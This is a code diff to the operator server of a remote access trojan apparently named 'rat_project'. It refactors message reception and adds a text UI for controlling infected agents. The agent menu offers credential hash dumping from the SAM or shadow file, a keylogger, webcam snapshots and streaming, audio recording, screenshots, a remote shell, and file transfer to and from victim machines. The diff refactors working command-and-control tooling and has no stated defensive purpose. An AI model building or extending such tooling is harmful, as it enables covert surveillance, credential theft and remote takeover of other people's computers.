@@ -14,7 +14,7 @@ from datetime import datetime
 from pathlib import Path
 from typing import Any
 
-from rat_project.common.protocol import decode_message, encode_message
+from rat_project.common.protocol import decode_message, encode_message, recv_message
 from rat_project.common.tls import create_server_ssl_context
 from rat_project.utils.logger_config import setup_logger
 
@@ -136,12 +136,7 @@ def handle_client(conn: socket.socket, addr: tuple[str, int]) -> None:
         logger.info("Incoming connection from %s:%s", addr[0], addr[1])
 
         # First message: registration required
-        data = conn.recv(4096)
-        if not data:
-            logger.warning("Empty data received from %s:%s", addr[0], addr[1])
-            return
-
-        payload = decode_message(data.decode("utf-8").strip())
+        payload = recv_message(conn)
 
         if payload.get("type") != "register":
             logger.warning("Invalid first message from %s:%s: %s", addr[0], addr[1], payload)
@@ -210,21 +205,11 @@ def send_command_and_recv(conn: socket.socket, command: str, extra: dict | None 
     message: dict[str, Any] = {"type": "command", "command": command}
     if extra:
         message.update(extra)
-
     conn.sendall(encode_message(message))
-    
-    # Read until newline delimiter
-    buffer = b""
-    while b"\n" not in buffer:
-        chunk = conn.recv(65536)
-        if not chunk:
-            break
-        buffer += chunk
-    
-    return decode_message(buffer.decode("utf-8").strip())
+    return recv_message(conn)
 
 
-def interact_with_session(session_id: int) -> None:
+def interact_with_session(session_id: int, port: int = PORT) -> None:
     """
     Opens an interactive session with an agent.
 
@@ -233,7 +218,10 @@ def interact_with_session(session_id: int) -> None:
 
     Args:
         session_id: Target session identifier.
+        port: Server port (shown in the TUI header).
     """
+    from rat_project.app.tui import _c, draw_agent_screen
+
     session = get_session(session_id)
 
     if session is None:
@@ -242,10 +230,12 @@ def interact_with_session(session_id: int) -> None:
 
     logger.info("Interaction opened with session %s", session_id)
     conn = session["conn"]
+    last_output = None  # last command output to display in the right panel
 
     while True:
         try:
-            command = input(f"rat agent {session_id} > ").strip()
+            draw_agent_screen(session_id, port, last_output)
+            command = input(_c(f"rat agent {session_id} > ")).strip()
 
             if not command:
                 continue
@@ -255,33 +245,40 @@ def interact_with_session(session_id: int) -> None:
                 break
 
             if command == "help":
-                print("Available commands for the agent:")
-                print("  sysinfo           - System information")
-                print("  ipconfig          - Network configuration")
-                print("  screenshot        - Take a screenshot")
-                print("  shell             - Interactive shell (bash/cmd)")
-                print("  search <name>     - Search for a file")
-                print("  download <path>   - Download a file from the agent")
-                print("  upload <path>     - Upload a file to the agent")
-                print("  hashdump          - Dump SAM (Windows) or shadow (Linux)")
-                print("  keylogger         - Start/stop the keylogger")
-                print("  webcam_snapshot   - Webcam photo")
-                print("  webcam_stream     - Live webcam stream (Ctrl+C to stop)")
-                print("  record_audio      - Audio recording (5 seconds)")
-                print("  back              - Return to main menu")
+                last_output = [
+                    "Available commands:",
+                    "",
+                    "  sysinfo           System information",
+                    "  ipconfig          Network configuration",
+                    "  screenshot        Take a screenshot",
+                    "  shell             Interactive shell (bash/cmd)",
+                    "  search <name>     Search for a file",
+                    "  download <path>   Download a file from agent",
+                    "  upload <path>     Upload a file to agent",
+                    "  hashdump          Dump SAM (Win) or shadow (Linux)",
+                    "  keylogger         Start/stop keylogger",
+                    "  webcam_snapshot   Webcam photo",
+                    "  webcam_stream     Live webcam stream (q to stop)",
+                    "  record_audio [s]  Audio recording (default: 5s)",
+                    "  back              Return to main menu",
+                ]
                 continue
 
             # --- Simple commands (no parameter) ---
             if command in (
                 "sysinfo",
                 "ipconfig",
-                "screenshot",
                 "hashdump",
                 "keylogger",
-                "webcam_snapshot",
             ):
                 response = send_command_and_recv(conn, command)
-                _print_response(response)
+                last_output = _response_to_lines(response)
+
+            # --- Commands that save an image ---
+            elif command in ("screenshot", "webcam_snapshot"):
+                response = send_command_and_recv(conn, command)
+                _save_image(response, command)
+                last_output = _response_to_lines(response)
 
             # --- record_audio [optional duration] ---
             elif command.startswith("record_audio"):
@@ -289,66 +286,74 @@ def interact_with_session(session_id: int) -> None:
                 duration = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 5
                 response = send_command_and_recv(conn, "record_audio", {"duration": duration})
                 _save_audio(response)
+                last_output = ["Audio recorded and saved."]
 
             # --- Webcam stream ---
             elif command == "webcam_stream":
                 _webcam_stream_session(conn, session_id)
+                last_output = ["Webcam stream ended."]
 
             # --- Interactive shell ---
             elif command == "shell":
                 _shell_session(conn, session_id)
+                last_output = ["Shell session ended."]
 
             # --- File search ---
             elif command.startswith("search "):
                 filename = command.split(maxsplit=1)[1]
                 response = send_command_and_recv(conn, "search", {"filename": filename})
-                _print_response(response)
+                last_output = _response_to_lines(response)
 
             # --- Download (agent → server) ---
             elif command.startswith("download "):
                 remote_path = command.split(maxsplit=1)[1]
                 _download_file(conn, remote_path)
+                last_output = [f"Download of '{remote_path}' done."]
 
             # --- Upload (server → agent) ---
             elif command.startswith("upload "):
                 local_path = command.split(maxsplit=1)[1]
                 _upload_file(conn, local_path, session_id)
+                last_output = [f"Upload of '{local_path}' done."]
 
             else:
                 logger.warning("Unknown agent command: %s", command)
-                print("[!] Unknown command. Type 'help'.")
+                last_output = [f"[!] Unknown command: '{command}'", "", "Type 'help' for the list."]
 
         except KeyboardInterrupt:
             print()
             break
-        except BrokenPipeError:
+        except (BrokenPipeError, ConnectionResetError, OSError):
             print(f"\n[-] Agent {session_id} disconnected.")
             remove_session(session_id)
             break
         except Exception as exc:
-            logger.exception("Error during interaction with session %s: %s", session_id, exc)
-            print(f"[!] Error: {exc}")
-            break
+            logger.exception("Error in session %s: %s", session_id, exc)
+            last_output = [f"[!] Error: {exc}"]
 
 
-def _print_response(response: dict[str, Any]) -> None:
-    """Display the agent's response output."""
+def _response_to_lines(response: dict[str, Any]) -> list[str]:
+    """Converts an agent response into lines for the TUI right panel."""
+    lines = []
     output = response.get("output", "")
     error = response.get("error", "")
-    data = response.get("data", None)
-    command = response.get("command", "")
-
     if output:
-        print(output)
+        lines.extend(output.splitlines())
     if error:
-        print(f"[!] Agent error: {error}")
-    if data and command in ("screenshot", "webcam_snapshot"):
+        lines.append(f"[!] Agent error: {error}")
+    if not lines:
+        lines.append("[*] Command executed (no output).")
+    return lines
+
+
+def _save_image(response: dict[str, Any], command: str) -> None:
+    """Saves the image from an agent response (screenshot / webcam_snapshot)."""
+    data = response.get("data")
+    if data:
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
         filename = f"{command}_{timestamp}.jpg"
         Path(filename).write_bytes(base64.b64decode(data))
-        print(f"[+] Image saved: {filename}")
-    elif data and not output:
-        print(f"[*] Data received ({len(data)} encoded bytes).")
+        logger.info("Image saved: %s", filename)
 
 
 def _shell_session(conn: socket.socket, session_id: int) -> None:
@@ -603,7 +608,8 @@ def run_server() -> None:
                 accept_thread = threading.Thread(target=accept_clients, args=(server_socket,), daemon=True)
                 accept_thread.start()
 
-                command_loop()
+                from rat_project.app.tui import tui_loop
+                tui_loop(port=PORT)
 
     except Exception as exc:
         logger.exception("Fatal server error: %s", exc)
